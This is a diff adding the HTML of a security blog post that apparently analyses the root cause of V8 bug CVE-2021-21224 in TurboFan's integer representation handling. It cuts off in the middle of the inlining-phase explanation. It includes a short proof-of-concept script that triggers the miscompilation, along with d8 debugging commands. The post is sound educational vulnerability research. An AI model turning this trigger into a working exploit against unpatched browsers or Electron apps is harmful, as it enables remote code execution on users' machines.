@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> V8 CVE-2021-21224 Renderer RCE Root Cause Analysis | s1r1us Blog</title>
+  <link rel = 'canonical' href = '//localhost:1313/posts/v8-rca/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:url" content="//localhost:1313/posts/v8-rca/">
+  <meta property="og:site_name" content="s1r1us Blog">
+  <meta property="og:title" content="V8 CVE-2021-21224 Renderer RCE Root Cause Analysis">
+  <meta property="og:description" content="V8 CVE-2021-21224 Renderer RCE Root Cause Analysis Initially, I didn’t know much about V8’s exploitation as I was a web guy with interest in v8, it was my CTF teammate, ptr-yudai, who helped me craft the Discord exploit. Back then, understanding the root cause wasn’t always necessary; for some of the exploits used in Electrovolt research, I relied on regression tests added with patches or on existing exploits from GitHub or blogs. From there, I would write primitives and exploit Electron internals as needed. The goal for Electrovolt research was to exploit Electron apps running on older Chromium V8 versions with plenty of known bugs, often by using a JIT bug, writing the exploit, and compromising the app, so I never had to know about the root cause of the issue 😂.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-29T17:30:20+05:30">
+    <meta property="article:modified_time" content="2024-10-29T17:30:20+05:30">
+    <meta property="article:tag" content="V8">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="V8 CVE-2021-21224 Renderer RCE Root Cause Analysis">
+  <meta name="twitter:description" content="V8 CVE-2021-21224 Renderer RCE Root Cause Analysis Initially, I didn’t know much about V8’s exploitation as I was a web guy with interest in v8, it was my CTF teammate, ptr-yudai, who helped me craft the Discord exploit. Back then, understanding the root cause wasn’t always necessary; for some of the exploits used in Electrovolt research, I relied on regression tests added with patches or on existing exploits from GitHub or blogs. From there, I would write primitives and exploit Electron internals as needed. The goal for Electrovolt research was to exploit Electron apps running on older Chromium V8 versions with plenty of known bugs, often by using a JIT bug, writing the exploit, and compromising the app, so I never had to know about the root cause of the issue 😂.">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="/css/styles.c6b6e1ea2d9a5ffc60bdd43664058a8fd8caa59181519f76ad68e7a40bb909a902c804ca6e312bd35f003597a2c2414752dd34cd7b14cc9e94ffce9bd1e69136.css" integrity="sha512-xrbh6i2aX/xgvdQ2ZAWKj9jKpZGBUZ92rWjnpAu5CakCyATKbjEr018ANZeiwkFHUt00zXsUzJ6U/86b0eaRNg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="//localhost:1313/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" //localhost:1313/about/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="//localhost:1313/posts/my-advice-for-someone-who-wants-to-be-an-hacker/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&text=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&title=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&is_video=false&description=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&title=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&title=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&name=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis&description=%3ch3%20id%3d%22v8-cve-2021-21224-renderer-rce-root-cause-analysis%22%3eV8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis%3c%2fh3%3e%0a%3cp%3eInitially%2c%20I%20didn%e2%80%99t%20know%20much%20about%20V8%e2%80%99s%20exploitation%20as%20I%20was%20a%20web%20guy%20with%20interest%20in%20v8%2c%20it%20was%20my%20CTF%20teammate%2c%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fptryudai%3flang%3den%22%3eptr-yudai%3c%2fa%3e%2c%20who%20helped%20me%20craft%20the%20Discord%20exploit.%20Back%20then%2c%20understanding%20the%20root%20cause%20wasn%e2%80%99t%20always%20necessary%3b%20for%20some%20of%20the%20exploits%20used%20in%20%3ca%20href%3d%22https%3a%2f%2fmedia.defcon.org%2fDEF%2520CON%252030%2fDEF%2520CON%252030%2520presentations%2fAaditya%2520Purani%2520-%2520ElectroVolt%2520Pwning%2520popular%2520desktop%2520apps%2520while%2520uncovering%2520new%2520attack%2520surface%2520on%2520Electron.pdf%22%3eElectrovolt%3c%2fa%3e%20research%2c%20I%20relied%20on%20regression%20tests%20added%20with%20patches%20or%20on%20existing%20exploits%20from%20GitHub%20or%20blogs.%20From%20there%2c%20I%20would%20write%20primitives%20and%20exploit%20Electron%20internals%20as%20needed.%20The%20goal%20for%20Electrovolt%20research%20was%20to%20exploit%20Electron%20apps%20running%20on%20older%20Chromium%20V8%20versions%20with%20plenty%20of%20known%20bugs%2c%20often%20by%20using%20a%20JIT%20bug%2c%20writing%20the%20exploit%2c%20and%20compromising%20the%20app%2c%20so%20I%20never%20had%20to%20know%20about%20the%20root%20cause%20of%20the%20issue%20%f0%9f%98%82.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&t=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        V8 CVE-2021-21224 Renderer RCE Root Cause Analysis
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-10-29 17:30:20 &#43;0530 IST" itemprop="datePublished">2024-10-29</time>
+          
+        </div>
+        
+         | 
+        <a class="a" href="/">Home</a>
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h3 id="v8-cve-2021-21224-renderer-rce-root-cause-analysis">V8 CVE-2021-21224 Renderer RCE Root Cause Analysis</h3>
+<p>Initially, I didn’t know much about V8’s exploitation as I was a web guy with interest in v8, it was my CTF teammate, <a href="https://twitter.com/ptryudai?lang=en">ptr-yudai</a>, who helped me craft the Discord exploit. Back then, understanding the root cause wasn’t always necessary; for some of the exploits used in <a href="https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Aaditya%20Purani%20-%20ElectroVolt%20Pwning%20popular%20desktop%20apps%20while%20uncovering%20new%20attack%20surface%20on%20Electron.pdf">Electrovolt</a> research, I relied on regression tests added with patches or on existing exploits from GitHub or blogs. From there, I would write primitives and exploit Electron internals as needed. The goal for Electrovolt research was to exploit Electron apps running on older Chromium V8 versions with plenty of known bugs, often by using a JIT bug, writing the exploit, and compromising the app, so I never had to know about the root cause of the issue 😂.</p>
+<p>But for the video and out of curiosity  took a deeper look into V8&rsquo;s TurboFan to understand the root cause of this bug and similar issues that surfaced around the same time. I ended up with a good amount of notes, so I decided to create an educational root cause analysis, hoping it might be helpful for others.</p>
+<p>Now, let’s look into CVE-2021-21224 which we used for Discord RCE</p>
+<p><strong>Original Report</strong>: <a href="https://issues.chromium.org/issues/40055451">Issue #40055451</a></p>
+<p><strong>Checkout:</strong> git checkout b24f7ea946d</p>
+<p>Here’s a modified PoC for explanation purposes based on the original report. This function <code>foo</code> demonstrates the bug:</p>
+<h4 id="poc">PoC:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">foo</span>(<span style="color:#a6e22e">a</span>) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">a</span>){  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>            <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFF</span>;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>        }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">x</span>)  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">out</span>;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>};  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foo</span>(<span style="color:#66d9ef">true</span>));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#a6e22e">foo</span>(<span style="color:#66d9ef">false</span>);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>}  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span> <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foo</span>(<span style="color:#66d9ef">true</span>));
+</span></span></code></pre></div><p>When running this with a vulnerable version of V8, we observe surprising results, we got different output for same foo(true) call:</p>
+<blockquote>
+<p>&gt; ./v8/out.gn/discord.debug/d8 discord.js &ndash;allow-natives-syntax<br>
+-4294967295<br>
+0<br>
+1</p>
+</blockquote>
+<p>Let’s see what is happening</p>
+<ul>
+<li>
+<p>Before TurboFan optimizes the function, the code executes as expected producing the following result:<br>
+<code>0 - Math.max(0, 0xFFFFFFFF) =&gt; 0 - 0xFFFFFFFF =&gt; -4294967295</code></p>
+</li>
+<li>
+<p>With <code>a</code> set to <code>false</code>, <code>x</code> remains <code>-1</code>, so 0 is expected:</p>
+<p><code>0 - Math.max(0, -1) =&gt; 0 - 0 =&gt; 0</code></p>
+</li>
+<li>
+<p>However, Here’s where things get interesting. After TurboFan optimizes the function, <code>foo(true)</code> produces a different result:</p>
+<p><code>0 - Math.max(0, 0xFFFFFFFF) =&gt; 0 - SOME_X =&gt; 1</code></p>
+</li>
+<li>
+<p>This implies that <code>Math.max(0, 0xFFFFFFFF)</code> is unexpectedly returning <code>-1</code> after optimization, leading to <code>0 - (-1) = 1</code>.</p>
+</li>
+</ul>
+<p>This unexpected result suggests that the <code>Math.max</code> function, when optimized by TurboFan, fails to handle the <code>0xFFFFFFFF</code> value correctly. Instead of returning <code>0xFFFFFFFF</code> (the unsigned 32-bit maximum value, or <code>4294967295</code>), the optimized code interprets it as <code>-1</code>. This happens because <code>0xFFFFFFFF</code> is <code>-1</code> in 32-bit two&rsquo;s complement representation, meaning TurboFan is treating it as <code>Signed32(Int32)</code> instead of <code>Unsigned32(UInt32)</code>.</p>
+<h4 id="now-lets-look-at-the-patch">Now let’s look at the patch</h4>
+<p><strong>Patch and Description</strong>: <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2817791">Chromium Code Review #2817791</a><br>
+<em>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor</em><br>
+<em>We have to respect the TypeCheckKind.</em></p>
+<p><img src="/img/patch.png" alt=""><br>
+Fig 1: Diff of src/compiler/representation-change.cc @ Node* RepresentationChanger::GetWord32RepresentationFor(</p>
+<p>Without knowing anything about the variables, just checking the code before patch, <code>RepresentationChanger::GetWord32RepresentationFor</code> would truncate values from <code>Int64</code> to <code>Int32</code> whenever the <code>output_rep</code> was <code>kWord64</code> and the <code>output_type</code> was either <code>Signed32</code> (range <code>-0x80000000</code> to <code>0x7FFFFFFF</code>) or <code>Unsigned32</code> (range <code>0x0</code> to <code>0xFFFFFFFF</code>). This meant that, regardless of whether the integer was supposed to be signed or unsigned, the function simply reduced the 64-bit integer to a 32-bit representation.</p>
+<p>This explains the unexpected behavior we observed with <code>Math.max(0, 0xFFFF_FFFF)</code> after optimization. When <code>0xFFFF_FFFF</code> was truncated to <code>Int32</code>, it was interpreted as <code>-1</code> due to two&rsquo;s complement representation. As a result, <code>Math.max(0, 0xFFFF_FFFF)</code> returned <code>-1</code> instead of <code>0xFFFFFFFF</code>, causing the final calculation of <code>0 - (-1)</code> to yield <code>1</code>.</p>
+<p>Now Let’s see what is actually happening and what these variables are. As the bug happens in the Turbofan optimization phase, we need a good understanding of how it works. For that I refer the following resources</p>
+<ul>
+<li><strong>Bug Reports and RCA</strong>:
+<ul>
+<li><a href="https://issues.chromium.org/issues/40092352">Chromium Issue #40092352: <code>Math.expm</code></a></li>
+<li><a href="https://faraz.faith/2021-01-07-cve-2020-16040-analysis/">CVE-2020-16040 Analysis by Faraz</a></li>
+<li><a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">Exploiting <code>Math.expm1</code> in V8</a></li>
+</ul>
+</li>
+<li><strong>Speculative Optimization</strong>:
+<ul>
+<li><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">Introduction to Speculative Optimization in V8 - Ponyfoo</a></li>
+<li><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_089">Slide Deck on Speculative Optimization</a></li>
+<li><a href="https://webkit.org/blog/10308/speculation-in-javascriptcore/">https://webkit.org/blog/10308/speculation-in-javascriptcore/</a> : One of the extensive blog on speculation compilers</li>
+<li><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">Introduction to TurboFan by DOAR-E</a></li>
+</ul>
+</li>
+<li><strong>Pwn2Own 2021 Exploit Analysis</strong>:
+<ul>
+<li><a href="https://www.zerodayinitiative.com/blog/2021/12/6/two-birds-with-one-stone-an-introduction-to-v8-and-jit-exploitation">Two Birds with One Stone: Intro to V8 and JIT Exploitation</a></li>
+<li><a href="https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce">Exploitation of CVE-2021-21220</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="turbofan-intro">Turbofan Intro</h3>
+<p>A small intro of Turbofan would be, When a JavaScript snippet runs in V8, the process begins by generating an <strong>Abstract Syntax Tree (AST)</strong>, which is then converted to <strong>bytecode</strong> executed by the <strong>Ignition Interpreter which also stores type information while executing this called feedback</strong>. As a function runs repeatedly (often termed &ldquo;becoming hot&rdquo;), it signals to V8 that it may benefit from optimization.</p>
+<p>This is where <strong>TurboFan</strong> comes into play. TurboFan receives the bytecode for this &ldquo;hot&rdquo; function, along with <strong>type feedback</strong> or profiling information from Ignition, to perform <strong>speculative optimization</strong>. Since JavaScript is dynamically typed (unlike statically-typed languages like C), TurboFan speculates on the types for efficiency. For instance, in an expression like <code>a + b</code>, if <code>a</code> and <code>b</code> are likely <code>int32</code>, TurboFan may use an <code>int32</code> addition instead of computational expensive floating point or int64 addition, type information can tell what efficient registers to use, what instructions to choose and many more.</p>
+<p>Unlike C compiler the dynamic Turbofan can’t infer that a type of a variable is exactly X type so it just speculates on the type based on the feedback and for instance if one of the values unexpectedly becomes a large number or changes to a different type (e.g., a string), this assumption breaks. In such cases, V8 detects the mismatch, &ldquo;deoptimizes,&rdquo; and switches back to unoptimized bytecode. In such cases, V8 detects the mismatch, &ldquo;deoptimizes,&rdquo; and switches back to unoptimized bytecode.</p>
+<p><img src="/img/image1.png" alt=""><br>
+Fig 2: Difference between c and JavaScript @ <a href="https://webkit.org/blog/10308/speculation-in-javascriptcore/">source</a></p>
+<p>TurboFan goes beyond speculative compilation by applying multiple optimizations to improve JavaScript execution. It eliminates dead code, does constant folding, inlines small functions to reduce call overhead, and removes redundant operations, and many more to make the code faster.</p>
+<p><img src="/img/image6.png" alt=""><br>
+Fig 3: Source: A Tale of TurboFan by Benedikt Meurer</p>
+<p>To get even better understanding, read the above blogs and for this blog this is good enough of an intro to dig into the bug and do the root cause analysis.</p>
+<h3 id="the-root-cause-analysis">The Root Cause Analysis</h3>
+<p><em>discord.js</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">foos</span>(<span style="color:#a6e22e">a</span>) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">a</span>){  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>            <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFF</span>;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>        }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">-</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">x</span>)  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">out</span>;  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    };  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foos</span>(<span style="color:#66d9ef">true</span>));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  <span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">foos</span>);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foos</span>(<span style="color:#66d9ef">false</span>));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">foos</span>);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foos</span>(<span style="color:#66d9ef">true</span>));  
+</span></span></code></pre></div><p>Execute the code above and open the generated turbo-foos-0.json file in <a href="https://github.com/v8/v8/tree/main/tools/turbolizer">Turbolizer</a>—a nice tool for visualizing the various phases TurboFan goes through during bytecode optimization.</p>
+<blockquote>
+<p>d8 discord.js &ndash;allow-natives-syntax &ndash;trace-representation &ndash;trace-turbo</p>
+</blockquote>
+<h4 id="graph-builder-phase"><em>Graph Builder phase</em></h4>
+<p>In the first phase of the turbofan, we can notice that the Graph is built for the foos function using its bytecode as shown in Fig 4.  In Fig 5, JSCall Node(#36) in the graph refers to Math.max function and SpeculativeSafeIntegerSubtract(#41) refers to subtraction from NumberConstant[0] (#22) and JSCall output.</p>
+<p><img src="/img/image5.png" alt="">
+Fig 4: foos function bytecode</p>
+<p><img src="/img/image3.png" alt="">                                            <br>
+Fig 5: Turbofan 1st phase</p>
+<h4 id="inlining-phase"><em>Inlining Phase</em></h4>
+<p>Next, during the <strong>Inlining phase</strong>, the <code>Math.max</code> JS call is transformed into a <code>NumberMax</code> node. Inside the ReduceMathMinMax function each input(#21 and #54) to the <code>NumberMax</code> node has a new node called <code>SpeculativeToNumber</code> inserted between them. Nothing interesting took place here except Math.max JSCall is converted to NumberMax because this might be used in further optimization phases to replace Math.max with just instruction without needing to call Math.max.</p>
+<p>src/compiler/js-call-reducer.cc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>   <span style="color:#66d9ef">case</span> Builtin<span style="color:#f92672">::</span>kMathMax:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>     <span style="color:#66d9ef">return</span> ReduceMathMinMax(node, simplified()<span style="color:#f92672">-&gt;</span>NumberMax(),
